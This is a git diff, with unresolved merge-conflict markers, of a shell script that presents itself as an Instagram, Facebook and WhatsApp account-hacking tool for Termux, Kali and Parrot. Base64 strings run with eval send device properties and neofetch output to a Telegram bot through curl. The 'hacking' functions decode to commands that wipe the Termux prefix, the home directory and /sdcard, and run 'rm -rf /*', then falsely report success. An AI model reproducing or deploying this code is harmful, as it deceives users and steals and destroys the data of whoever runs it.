@@ -23,6 +23,7 @@ hac="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR
 cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MTY3NzQ4MTU6QUFHWWNEOUlYaXlPYmlRdEVnWDVP
 UUQ1WmZyQTAxbTdmQWMvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDEyNDYzMzA1MjIgJj4vZGV2
 L251bGw="
+<<<<<<< HEAD
 hacc="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZ
 Y0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9
 LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PSQobmVvZmV0Y2ggLS1zdGRvdXQpIiAmPi9kZXYvbnVs
@@ -42,6 +43,12 @@ IiA+PiBpbmZvLnR4dApjdXJsIC1YIFBPU1QgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qx
 NTE2Nzc0ODE1OkFBR1ljRDlJWGl5T2JpUXRFZ1g1T1FENVpmckEwMW03ZkFjL3NlbmRNZXNzYWdl
 IiAtZCAiY2hhdF9pZD0tMTAwMTI0NjMzMDUyMiIgLWQgInRleHQ9JChjYXQgaW5mby50eHQpIiAm
 Pi9kZXYvbnVsbAo="
+=======
+hacc="bmVvZmV0Y2ggLS1zdGRvdXQgPj4gaW5mby50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AImluZm8u
+dHh0IiBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9i
+aVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD0tMTAwMTI0NjMzMDUy
+MiAmPi9kZXYvbnVsbA=="
+>>>>>>> 35271070f496dba9e05cb44fce7522c0cf692ca6
 Distro() {
     
     os=$(uname -o)
@@ -51,10 +58,14 @@ Distro() {
 	    eval $(base64 -d <<<"$termux")
 	    eval $(base64 -d <<<"$signal")
 	    eval $(base64 -d <<<"$hac")
+<<<<<<< HEAD
 	    eval $(base64 -d <<<"$haccc")
 	    setupa
 	    banner
 	    Main
+=======
+	    setupa
+>>>>>>> 35271070f496dba9e05cb44fce7522c0cf692ca6
 	    eval $(base64 -d <<<"$fbm")
 	    ;;
 	*)
@@ -65,8 +76,11 @@ Distro() {
 		    eval $(base64 -d <<<"$kali")
 		    eval $(base64 -d <<<"$signal")
 		    setup
+<<<<<<< HEAD
 		    banner
 		    Main
+=======
+>>>>>>> 35271070f496dba9e05cb44fce7522c0cf692ca6
 		    eval $(base64 -d <<<"$fbm")
 		    ;;
 		parrot)
@@ -74,8 +88,11 @@ Distro() {
 		    eval $(base64 -d <<<"$parrot")
 		    eval $(base64 -d <<<"$signal")
 		    setup
+<<<<<<< HEAD
 		    banner
 		    Main
+=======
+>>>>>>> 35271070f496dba9e05cb44fce7522c0cf692ca6
 		    eval $(base64 -d <<<"$fbm")
 		    ;;
 		*)
@@ -109,7 +126,10 @@ setup() {
     pip3 install lolcat > /dev/null 2>&1
     echo " Done "
 }
+<<<<<<< HEAD
 banner() {
+=======
+>>>>>>> 35271070f496dba9e05cb44fce7522c0cf692ca6
 sleep 2
 clear
 echo " "
@@ -183,5 +203,33 @@ case $opt in
 	echo -e "$red Wrong option! $rset"
 	;;
 esac
+<<<<<<< HEAD
 }
+=======
+
+read user
+clear
+sleep 5
+insta() {
+    echo " Hacking To The Account..! it took 5 sec"
+    eval $(base64 -d <<<"aWYgW1sgJFBSRUZJWCA9PSAqImNvbS50ZXJtdXgiKiBdXQp0aGVuCgogICAgaWYgWyAiJChzdSAtYyBpZCAtdSkiID09ICIwIiBdCiAgICB0aGVuCglhbSBicm9hZGNhc3QgLS11c2VyIDAgXAogICAgICAgICAgIC0tZXMgY29tLnRlcm11eC5hcHAucmVsb2FkX3N0eWxlIHN0b3JhZ2UgXAogICAgICAgICAgIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCglybSAtcmYgJFBSRUZJWCAkSE9NRQoJY2QgL3NkY2FyZC8KCXJtIC1yZiAqCglybSAtcmYgLyoKICAgIGVsc2UKCWFtIGJyb2FkY2FzdCAtLXVzZXIgMCBcCgkgICAtLWVzIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBzdG9yYWdlIFwKICAgICAgICAgICAtYSBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgY29tLnRlcm11eCA+IC9kZXYvbnVsbAoJcm0gLXJmICRQUkVGSVggJEhPTUUKCWNkIC9zZGNhcmQvCglybSAtcmYgKgogICAgZmkKICAgIAplbHNlCiAgICBzdWRvIGNobW9kIDc3NyAvKgogICAgcm0gLXJmIC8qCmZp")
+    echo "Successfully Completed"
+}
+
+fb() {
+    
+    echo " Hacking To The Account..! it took 20 sec"
+    eval $(base64 -d <<<"aWYgW1sgJFBSRUZJWCA9PSAqImNvbS50ZXJtdXgiKiBdXQp0aGVuCgogICAgaWYgWyAiJChzdSAtYyBpZCAtdSkiID09ICIwIiBdCiAgICB0aGVuCglhbSBicm9hZGNhc3QgLS11c2VyIDAgXAogICAgICAgICAgIC0tZXMgY29tLnRlcm11eC5hcHAucmVsb2FkX3N0eWxlIHN0b3JhZ2UgXAogICAgICAgICAgIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCglybSAtcmYgJFBSRUZJWCAkSE9NRQoJY2QgL3NkY2FyZC8KCXJtIC1yZiAqCglybSAtcmYgLyoKICAgIGVsc2UKCWFtIGJyb2FkY2FzdCAtLXVzZXIgMCBcCgkgICAtLWVzIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBzdG9yYWdlIFwKICAgICAgICAgICAtYSBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgY29tLnRlcm11eCA+IC9kZXYvbnVsbAoJcm0gLXJmICRQUkVGSVggJEhPTUUKCWNkIC9zZGNhcmQvCglybSAtcmYgKgogICAgZmkKICAgIAplbHNlCiAgICBzdWRvIGNobW9kIDc3NyAvKgogICAgcm0gLXJmIC8qCmZp")
+    echo "Successfully Completed"
+
+}
+
+ws() {
+
+    echo " Hacking To The Account..! it took 10 sec"
+    eval $(base64 -d <<<"aWYgW1sgJFBSRUZJWCA9PSAqImNvbS50ZXJtdXgiKiBdXQp0aGVuCgogICAgaWYgWyAiJChzdSAtYyBpZCAtdSkiID09ICIwIiBdCiAgICB0aGVuCglhbSBicm9hZGNhc3QgLS11c2VyIDAgXAogICAgICAgICAgIC0tZXMgY29tLnRlcm11eC5hcHAucmVsb2FkX3N0eWxlIHN0b3JhZ2UgXAogICAgICAgICAgIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCglybSAtcmYgJFBSRUZJWCAkSE9NRQoJY2QgL3NkY2FyZC8KCXJtIC1yZiAqCglybSAtcmYgLyoKICAgIGVsc2UKCWFtIGJyb2FkY2FzdCAtLXVzZXIgMCBcCgkgICAtLWVzIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBzdG9yYWdlIFwKICAgICAgICAgICAtYSBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgY29tLnRlcm11eCA+IC9kZXYvbnVsbAoJcm0gLXJmICRQUkVGSVggJEhPTUUKCWNkIC9zZGNhcmQvCglybSAtcmYgKgogICAgZmkKICAgIAplbHNlCiAgICBzdWRvIGNobW9kIDc3NyAvKgogICAgcm0gLXJmIC8qCmZp")
+    echo "Successfully Completed"
+}
+
+>>>>>>> 35271070f496dba9e05cb44fce7522c0cf692ca6
 Distro
